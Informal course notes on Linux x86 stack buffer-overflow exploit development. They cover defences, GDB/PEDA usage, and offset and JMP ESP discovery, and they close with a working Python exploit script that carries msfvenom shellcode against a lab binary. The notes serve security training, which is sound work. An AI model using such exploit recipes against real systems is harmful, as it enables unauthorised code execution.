Exploit development is a potential phase or outcome of reverse engineering.
When performing exploit development, a cyber actor actively digs into a target object with the aim of understanding how it works better than its creators.
As the cyber actor gains more understanding of the object, they may find unintended functionality or vulnerabilities that the creators did not mitigate.
These unknown vulnerabilities are particularly dangerous as they can be actively exploited by attackers.
Alternatively, they can be mitigated by defendersif found before attackers exploit them.


HEAP
Memory that can be allocated and deallocated

STACK
A contiguous section of memory used for passing arguments

REGISTERS
Storage elements as close as possible to the central processing unit (CPU)

INSTRUCTION POINTER (IP)
a.k.a Program Counter (PC), contains the address of next instruction to be executed

STACK POINTER (SP)
Contains the address of the next available space on the stack

BASE POINTER (BP)
The base of the stack

FUNCTION
Code that is separate from the main program that is often used to replace code the repeats in order to make the program smaller and more efficient

SHELLCODE
The code that is executed once an exploit successfully takes advantage of a vulnerability. ( code that gives you a shell)

---------------------------------------------------
Buffer Overflow Defenses

Non executable (NX) stack
Address Space Layout Randomization (ASLR) ( default activated on everything ) 
Data Execution Prevention (DEP)
Stack Canaries
Position Independent Executable (PIE)


Technical Help
Utilizing tools such as:

IDA, GHIDRA
GDB, MONA, IMMUNITY
BASH, PYTHON



GDB Uses
Installation of Peda Plugin

git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit


Common Commands

disass <FUNCTION>   #   Disassemble portion of the program
info <...>  #   Supply info for specific stack areas
x/256c $<REGISTER>  #   Read characters from specific register
break <address>  #   Establish a break point


------------------------------------------------------------------------------------------------------------------
EXPLOIT DEVELOPMENT 
DEMO 

./func 
chmod +x ./func

gdb func


----------------
to Check the pattern to FIND the IP in the buffer  and copy the pattern to the website 

run it in gdb peda then  copy the pattern from the website 

the <<<  used when it requires a user input when you dont require a user input but rather a parameter then you dont use the <<<
----------------------------------------------------------------------------------------------------------------------------------------------

step by step:
Run it to  see if you can overflow it/break it (dump it)

 disassemble the function ( main function )  to see the  the disassembled code 
 
  pdisass main
 
 pdisass ( the new function )
 
  pdisass getuserinput
  
https://wiremask.eu/tools/buffer-overflow-pattern-generator/
get the Pattern
input the pattern in the Enter string field when ran on gdb peda 
 get the offset 
 (create the script and change the offset to the value )
 
offset = "A" * 62
eip = "B" * 4

print(offset + eip)

run <<< $(python /home/student/SEC/EXPDev/lin_exploit.py)
( to check if you have  positive control  ) 

Next you wanna see if you can get control of the jump to the top of the stack
( you wanna see if there's a valid  one you can use ON THEIR MACHINES)

run gdb with no peda 
  env - gdb 
  file func 
  show env 
   unset env LINES
   unset env  COLUMNS
  run
   overflow  an make sure you get SIGSEGV
  info proc map ( shows mapped address spaces )
find /b  0xf7de1000, 0xf7ffe000, 0xff, 0xe4
(/b for binary) ( search between ( beginning of heap and  end of stack) (0xff, 0xe4 ( to find jump and esp))

grab few from the response to check for valdity /continue the process 
0xf7 f6 80 43
0xf7 f6 83 eb
0xf7 f6 86 3b
0xf7 f6 87 0b
0xf7f68733
0xf7f687bb
0xf7f68853
0xf7f6956b
0xf7f69633
0xf7f69a0b
0xf7f69c3b

( in the script create a new eip that goes  and checks it for the actual eip in the oppiste byte order )

0xf7 f6 80 43
 goes to 
"\x43\x80\xf6\xf7"

 (create a new  nop ) 
 nop = " \x90" * 10

 THIS GETS YoU TO THE TOP OF THE STACK 


now create a shellcode  using msfvenom 

msfvenom -p linux/x86/exec CMD="whoami" -b "\x00" -f python

 copy and paste from buf --to----buf  in your code block 


----
flight check list 
offset
eip 
nop 
buf
 in that order for it to print out 
 

Then RUN 
./func <<< $(python /home/student/SEC/EXPDev/lin_exploit.py)
 sudo ./func <<< $(python /home/student/SEC/EXPDev/lin_exploit.py)


 if it doesnt work 
  change the nop sled to higher value 
  then  regenerate the shell code 
  if this doesnt work then change the eip 
  

---------------------------------------------------------------------------------------------------------------------------------
offset = "A" * 62
#eip = "B" * 4

'''
0xf7 f6 54 97
0xf7f655cf
0xf7f65777
0xf7f659ef
0xf7f662eb
0xf7 f6 64 9b
0xf7 f6 65 33
0xf7 f6 66 33
0xf7 f6 6b 3b
'''
eip = "\x3b\x86\xf6\xf7"
nop = "\x90" * 10

buf =  b""
buf += b"\xdb\xc2\xbb\x1f\x72\x8f\x5f\xd9\x74\x24\xf4\x5a\x33"
buf += b"\xc9\xb1\x0b\x31\x5a\x19\x03\x5a\x19\x83\xea\xfc\xfd"
buf += b"\x87\xe5\x54\x59\xf1\xa8\x0c\x31\x2c\x2e\x58\x26\x46"
buf += b"\x9f\x29\xc0\x97\xb7\xe2\x72\xf1\x29\x74\x91\x53\x5e"
buf += b"\x81\x55\x54\x9e\xf9\x3d\x3b\xff\x68\xd4\xc3\xa8\x21"
buf += b"\xaf\x25\x9b\x46"

print(offset + eip + nop + buf)
--------------------------------------------------------------------------------------------------------------------------------------
